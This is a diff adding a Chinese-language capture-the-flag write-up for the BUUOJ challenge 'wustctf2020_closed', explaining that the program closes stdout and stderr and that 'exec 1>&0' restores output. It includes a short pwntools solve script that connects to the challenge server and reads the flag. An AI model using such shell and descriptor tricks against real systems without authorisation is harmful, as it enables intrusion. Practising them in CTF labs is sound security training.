@@ -532,6 +532,34 @@ if __name__ == "__main__":
     main()
 ```
 
+### wustctf2020_closed
+
+[题目链接](https://buuoj.cn/challenges#wustctf2020_closed)
+
+没见过的题目，做一下。
+
+<img width="2355" height="956" alt="image" src="https://github.com/user-attachments/assets/9e3d00ae-b9be-4ab9-97e3-dde6b0574d1e" />
+
+close(1) 关闭输出流，close(2) 关闭错误流，但是没有关闭输入流（0），所以我们对 shell 发送的东西都可以被收到，包括 cat flag，但是它不能输出。
+
+所以我们 `exec 1>&0` **“将文件描述符 1 复制/重定向到文件描述符 0 所指向的位置”。**
+
+也就是把输出流绑到输入流上。
+
+```
+from pwn import *
+
+p = remote('node5.buuoj.cn', 27871) 
+
+p.recvuntil(b"What else can you do???\n")
+
+p.sendline(b"exec 1>&0")
+
+p.sendline(b"cat flag")
+
+p.interactive()
+```
+
 ## 中水区
 
 可能只有主播这种区才会觉得这里是中水区。
